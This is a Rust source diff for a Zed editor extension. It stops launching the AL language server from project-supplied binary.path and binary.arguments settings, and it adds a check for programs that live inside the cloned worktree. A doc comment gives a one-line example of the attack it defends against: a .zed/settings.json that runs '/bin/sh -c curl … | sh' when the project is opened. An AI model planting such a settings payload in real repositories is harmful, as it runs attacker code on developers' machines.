@@ -104,21 +104,61 @@ fn set_nested_value_inner(
     set_nested_value_inner(child, &path[1..], value, depth + 1);
 }
 
-/// Resolve the al-lsp launch arguments from user settings.
+/// The program and arguments the extension hands Zed for the language server.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct ServerLaunch {
+    /// A program to run instead of the one the extension resolves, or `None`
+    /// when the extension chooses `al-lsp` itself. Always `None` today.
+    pub program: Option<String>,
+    /// The arguments the server starts with.
+    pub args: Vec<String>,
+}
+
+/// Decide what the language server session runs, given the settings Zed merged.
 ///
-/// Priority:
-/// 1. An explicit `binary.arguments` override always wins (power users).
-/// 2. `al.useOfficialLsp: true` (flat, dotted, or nested under `"al"`)
-///    delegates the session to Microsoft's official AL Language Server
-///    via `al-lsp --official-lsp` (requires ALTool v17+ on the machine).
-/// 3. Default: the built-in native server over stdio.
-pub fn resolve_server_args(
-    user_args: Option<Vec<String>>,
+/// `LspSettings::for_worktree` returns the user's settings and the worktree's
+/// `.zed/settings.json` already merged, and `zed_extension_api` 0.7 exposes no
+/// way to ask for the user-level value alone. So a `binary` block arriving
+/// here may be one a cloned repository wrote, and that block names a program
+/// and its arguments, which together are the whole payload: a
+/// `.zed/settings.json` holding
+/// `{"lsp":{"al-lsp":{"binary":{"path":"/bin/sh","arguments":["-c","curl … | sh"]}}}}`
+/// would run on open.
+///
+/// The extension runs in Zed's WASM sandbox with no filesystem and no process,
+/// so it cannot read `trusted-projects.json`, and `binary.path` decides whether
+/// al-lsp runs at all, so al-lsp cannot be the one to refuse it either. The
+/// rule is therefore the extension's own and it is flat: `binary.path` and
+/// `binary.arguments` are ignored, whoever wrote them. al-lsp is chosen by
+/// this extension (session cache, then `al-lsp` on PATH, then the cached or
+/// downloaded release), and its arguments come from `al.useOfficialLsp`.
+///
+/// To run a specific build, put it on PATH. Zed itself blocks project settings
+/// in an untrusted worktree from v0.218.2-pre (advisory GHSA-29cp-2hmh-hcxj);
+/// this rule is what an older Zed does not give us, and it holds on every Zed.
+///
+/// See `Docs/features/project-trust.md` and
+/// `Docs/current-limitations.md#zed-worktree-settings-and-executable-paths`.
+pub fn resolve_server_launch(
+    _settings_binary_path: Option<&str>,
+    _settings_binary_arguments: Option<&[String]>,
     user_settings: Option<&serde_json::Value>,
-) -> Vec<String> {
-    if let Some(args) = user_args {
-        return args;
+) -> ServerLaunch {
+    ServerLaunch {
+        program: None,
+        args: resolve_server_args(user_settings),
     }
+}
+
+/// Resolve the al-lsp launch arguments from the AL settings block.
+///
+/// `al.useOfficialLsp: true` (flat, dotted, or nested under `"al"`) delegates
+/// the session to Microsoft's official AL Language Server via `al-lsp
+/// --official-lsp` (requires ALTool v17+ on the machine). Otherwise the
+/// built-in native server runs over stdio.
+///
+/// `binary.arguments` is not a source here: see [`resolve_server_launch`].
+pub fn resolve_server_args(user_settings: Option<&serde_json::Value>) -> Vec<String> {
     let use_official = user_settings
         .and_then(|s| {
             s.get("useOfficialLsp")
@@ -180,6 +220,106 @@ pub fn resolve_dotnet_path(user_settings: Option<&serde_json::Value>) -> Option<
         .map(str::trim)
         .filter(|path| !path.is_empty())
         .map(ToOwned::to_owned)
+}
+
+/// Whether `path` names a program the worktree itself carries.
+///
+/// `LspSettings::for_worktree` returns the user's settings and the worktree's
+/// `.zed/settings.json` already merged, and `zed_extension_api` 0.7 exposes no
+/// way to ask for the user-level value alone (`wit::get_settings`, which takes
+/// the location, is private to the crate). So the extension cannot tell who
+/// wrote `binary.path` or `dotnetPath`. It can tell where the program lives,
+/// which is the part that matters: a relative path resolves against the
+/// worktree, and an absolute path under the worktree root is a file the clone
+/// brought with it.
+///
+/// Zed itself blocks project settings until a worktree is trusted, from
+/// v0.218.2-pre (advisory GHSA-29cp-2hmh-hcxj). This check is what an older
+/// Zed does not give us.
+///
+/// A false answer is not an authorisation. It says only that the program is
+/// not a file the clone carried, which leaves every program the machine
+/// already has. The language server's own program and arguments are decided by
+/// [`resolve_server_launch`], which ignores the settings outright; this check
+/// covers `dotnetPath`, where al-lsp does the rest (`trust::enforce_dotnet_path`).
+///
+/// See `Docs/current-limitations.md#zed-worktree-settings-and-executable-paths`.
+/// Both spellings are compared as component lists rather than as text, because
+/// `/home/me/src/../src/SomeApp/tools/al-lsp` and
+/// `/home/me/src/SomeApp/tools/al-lsp` name one file and diverge at the fourth
+/// character. Nothing here touches the filesystem: the extension runs as a
+/// WASM module with no path API, so a path reached through a *symlinked*
+/// ancestor is still outside what this can see.
+pub fn is_worktree_resident_program(path: &str, worktree_root: &str) -> bool {
+    let path = path.trim();
+    if path.is_empty() {
+        return false;
+    }
+    if !is_absolute_path(path) {
+        // A relative path resolves against the worktree, wherever it points.
+        return true;
+    }
+    let Some(program) = normalised_components(path) else {
+        // `..` above the filesystem root names nothing. Refuse rather than
+        // guess what the author meant.
+        return true;
+    };
+    let Some(root) = normalised_components(worktree_root.trim()) else {
+        return true;
+    };
+    if root.is_empty() || program.len() < root.len() {
+        return false;
+    }
+    // A Windows path is matched without regard to case, because the filesystem
+    // is: `c:\users\me` and `C:\Users\Me` are the same directory.
+    let ignore_case = looks_like_windows(path) || looks_like_windows(worktree_root);
+    root.iter().zip(&program).all(|(root, program)| {
+        if ignore_case {
+            root.eq_ignore_ascii_case(program)
+        } else {
+            root == program
+        }
+    })
+}
+
+/// Whether `path` starts at a filesystem root: `/…`, `\…`, or a drive such as
+/// `C:\…` or `C:/…`.
+fn is_absolute_path(path: &str) -> bool {
+    if path.starts_with('/') || path.starts_with('\\') {
+        return true;
+    }
+    let bytes = path.as_bytes();
+    bytes.len() > 2
+        && bytes[0].is_ascii_alphabetic()
+        && bytes[1] == b':'
+        && (bytes[2] == b'\\' || bytes[2] == b'/')
+}
+
+/// Whether the path is written the way Windows writes one, which is how the
+/// extension knows to compare it without regard to case. The extension is a
+/// WASM module and cannot ask the host what it runs on.
+fn looks_like_windows(path: &str) -> bool {
+    let bytes = path.as_bytes();
+    path.contains('\\') || (bytes.len() > 1 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':')
+}
+
+/// The components of `path`, with `.` dropped, repeated separators collapsed
+/// and `..` folded into the component before it.
+///
+/// `None` when a `..` climbs above the first component, which is a path no
+/// comparison can make sense of.
+fn normalised_components(path: &str) -> Option<Vec<&str>> {
+    let mut components: Vec<&str> = Vec::new();
+    for part in path.split(['/', '\\']) {
+        match part {
+            "" | "." => {}
+            ".." => {
+                components.pop()?;
+            }
+            name => components.push(name),
+        }
+    }
+    Some(components)
 }
 
 /// Select and normalize the AL settings needed by the separate DAP process
